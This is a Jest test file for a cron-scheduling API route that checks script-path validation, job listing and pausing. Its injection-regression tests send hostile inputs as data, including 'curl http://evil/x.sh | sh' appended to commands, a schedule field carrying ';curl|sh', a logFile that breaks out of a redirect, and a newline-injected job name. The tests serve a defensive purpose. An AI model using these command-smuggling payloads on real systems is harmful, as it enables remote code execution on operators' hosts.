/** @jest-environment node */
/**
 * System cron API. The route delegates OS work to host-scheduler (crontab on
 * Unix, schtasks on Windows), so we mock that abstraction — the test runs
 * identically on every platform. fs is mocked for the disabled-ids JSON only.
 */

const mockReadFileSync = jest.fn();
const mockWriteFileSync = jest.fn();
const mockUnlinkSync = jest.fn();
jest.mock("fs", () => ({
  readFileSync: (...a: unknown[]) => mockReadFileSync(...a),
  writeFileSync: (...a: unknown[]) => mockWriteFileSync(...a),
  unlinkSync: (...a: unknown[]) => mockUnlinkSync(...a),
}));

let mockCrontab = "";
const mockWritten: string[] = [];
const mockSetEnabled: Array<[string, boolean]> = [];
jest.mock("@/lib/host-scheduler", () => ({
  getHostScheduler: () => ({
    readRaw: async () => mockCrontab,
    writeRaw: async (c: string) => {
      mockWritten.push(c);
      return { ok: true };
    },
    setEnabled: async (id: string, enabled: boolean) => {
      mockSetEnabled.push([id, enabled]);
    },
  }),
}));

jest.mock("@/lib/paths", () => ({
  PS_DATA_DIR: "/tmp/ch-data",
  getPsScriptsDir: () => "/tmp/ch-data/scripts",
  getPsHardwareLogDir: () => "/tmp/ch-data/logs",
  readEnv: (...keys: string[]) => {
    for (const k of keys) {
      const v = process.env[k];
      if (v && String(v).trim()) return String(v).trim();
    }
    return undefined;
  },
}));

// The route now REBUILDS the command from a resolved script path instead of
// substring-checking the caller's text, so the test must say which script names
// exist. `fs` is mocked above, so the real existsSync-backed resolver cannot run.
jest.mock("@/lib/scripts-manager", () => ({
  resolveScriptPath: (name: string) =>
    ["ps-backup.mjs", "ps-health-check.mjs"].includes(name) ? `/tmp/ch-data/scripts/${name}` : null,
}));

jest.mock("@/lib/api-logger", () => ({ logApiError: jest.fn() }));

import { mockRequest } from "../helpers/api-test-helpers";

beforeEach(() => {
  jest.clearAllMocks();
  mockCrontab = "";
  mockWritten.length = 0;
  mockSetEnabled.length = 0;
  mockReadFileSync.mockImplementation(() => {
    throw Object.assign(new Error("ENOENT"), { code: "ENOENT" });
  });
});

describe("GET /api/cron/hardware/meta", () => {
  it("returns scriptsDir and logDir from paths", async () => {
    const { GET } = await import("@/app/api/cron/hardware/meta/route");
    const res = await GET(mockRequest("http://127.0.0.1/api/test"));
    expect(res.status).toBe(200);
    const body = (await res.json()) as { data?: { scriptsDir: string; logDir: string } };
    expect(body.data?.scriptsDir).toBe("/tmp/ch-data/scripts");
    expect(body.data?.logDir).toBe("/tmp/ch-data/logs");
  });
});

describe("GET /api/cron/hardware", () => {
  it("returns jobs whose commands run scripts under the scripts dir", async () => {
    mockCrontab = "*/10 * * * * /tmp/ch-data/scripts/ps-backup.mjs >> /tmp/ch-data/logs/ps-backup.log 2>&1\n";
    const { GET } = await import("@/app/api/cron/hardware/route");
    const res = await GET(mockRequest("http://127.0.0.1/api/test"));
    expect(res.status).toBe(200);
    const body = (await res.json()) as { data?: { jobs: Array<{ id: string; name: string }>; total: number } };
    expect(body.data?.total).toBe(1);
    expect(body.data?.jobs[0]?.id).toBe("ps-backup");
    expect(body.data?.jobs[0]?.name).toContain("Backup");
  });

  it("ignores crontab lines outside the scripts dir", async () => {
    mockCrontab = "*/10 * * * * /home/user/.hermes/scripts/ps-backup.mjs >> /tmp/x.log 2>&1\n";
    const { GET } = await import("@/app/api/cron/hardware/route");
    const res = await GET(mockRequest("http://127.0.0.1/api/test"));
    const body = (await res.json()) as { data?: { total: number; jobs: unknown[] } };
    expect(body.data?.total).toBe(0);
    expect(body.data?.jobs).toEqual([]);
  });
});

describe("POST /api/cron/hardware", () => {
  it("400 when the command is not under the scripts dir; nothing written", async () => {
    const { POST } = await import("@/app/api/cron/hardware/route");
    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
      schedule: "*/5 * * * *",
      command: "/home/user/.hermes/scripts/ps-backup.mjs",
      name: "Bad path",
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
    expect(mockWritten).toHaveLength(0);
  });

  it("200 and writes the schedule when the command is under the scripts dir", async () => {
    mockCrontab = "\n";
    const { POST } = await import("@/app/api/cron/hardware/route");
    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
      schedule: "*/5 * * * *",
      command: "/tmp/ch-data/scripts/ps-backup.mjs",
      name: "Backup",
    });
    const res = await POST(req);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { data?: { id: string } };
    expect(body.data?.id).toBe("ps-backup");
    expect(mockWritten).toHaveLength(1);
    expect(mockWritten[0]).toContain("/tmp/ch-data/scripts/ps-backup.mjs");
  });

  // ── Injection regressions ─────────────────────────────────────────────
  // The old validator was `line.includes(scriptsDir + "/")`, a substring test.
  // Each of these passed it and became a line in the operator's crontab.

  it("rejects a command that merely MENTIONS the scripts dir", async () => {
    const { POST } = await import("@/app/api/cron/hardware/route");
    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
      schedule: "*/5 * * * *",
      command: "curl http://evil/x.sh | sh # /tmp/ch-data/scripts/",
      name: "pwn",
    });
    expect((await POST(req)).status).toBe(400);
    expect(mockWritten).toHaveLength(0);
  });

  it("discards anything appended to a legitimate script path", async () => {
    mockCrontab = "\n";
    const { POST } = await import("@/app/api/cron/hardware/route");
    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
      schedule: "*/5 * * * *",
      command: "/tmp/ch-data/scripts/ps-backup.mjs; curl http://evil/x.sh | sh",
      name: "Backup",
    });
    expect((await POST(req)).status).toBe(200);
    expect(mockWritten[0]).not.toContain("evil");
    expect(mockWritten[0]).not.toContain("curl");
  });

  it("rejects a schedule field carrying a payload", async () => {
    const { POST } = await import("@/app/api/cron/hardware/route");
    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
      schedule: "* * * * *;curl|sh",
      command: "/tmp/ch-data/scripts/ps-backup.mjs",
    });
    expect((await POST(req)).status).toBe(400);
    expect(mockWritten).toHaveLength(0);
  });

  it("rejects a logFile that breaks out of the redirect", async () => {
    const { POST } = await import("@/app/api/cron/hardware/route");
    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
      schedule: "*/5 * * * *",
      command: "/tmp/ch-data/scripts/ps-backup.mjs",
      logFile: "/tmp/x.log 2>&1; curl http://evil/x.sh | sh #",
    });
    expect((await POST(req)).status).toBe(400);
    expect(mockWritten).toHaveLength(0);
  });

  it("flattens a newline in the job name so it cannot add a crontab line", async () => {
    mockCrontab = "\n";
    const { POST } = await import("@/app/api/cron/hardware/route");
    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", {
      schedule: "*/5 * * * *",
      command: "/tmp/ch-data/scripts/ps-backup.mjs",
      name: "Backup\n* * * * * curl http://evil/x.sh | sh",
    });
    expect((await POST(req)).status).toBe(200);
    // The payload may still appear as TEXT, but only inside the single `#`
    // comment line — never as a crontab entry of its own. That is the invariant.
    const executableLines = mockWritten[0]
      .split("\n")
      .filter((l) => l.trim() && !l.trim().startsWith("#"));
    expect(executableLines).toHaveLength(1);
    expect(executableLines[0]).not.toContain("evil");
  });

  it("pauseAll disables each managed job", async () => {
    mockCrontab = "*/5 * * * * /tmp/ch-data/scripts/ps-backup.mjs >> /tmp/ch-data/logs/ps-backup.log 2>&1\n";
    const { POST } = await import("@/app/api/cron/hardware/route");
    const req = mockRequest("http://127.0.0.1/api/cron/hardware", "POST", { action: "pauseAll" });
    const res = await POST(req);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { data?: { pausedCount?: number } };
    expect(body.data?.pausedCount).toBe(1);
    expect(mockSetEnabled).toEqual([["ps-backup", false]]);
  });
});
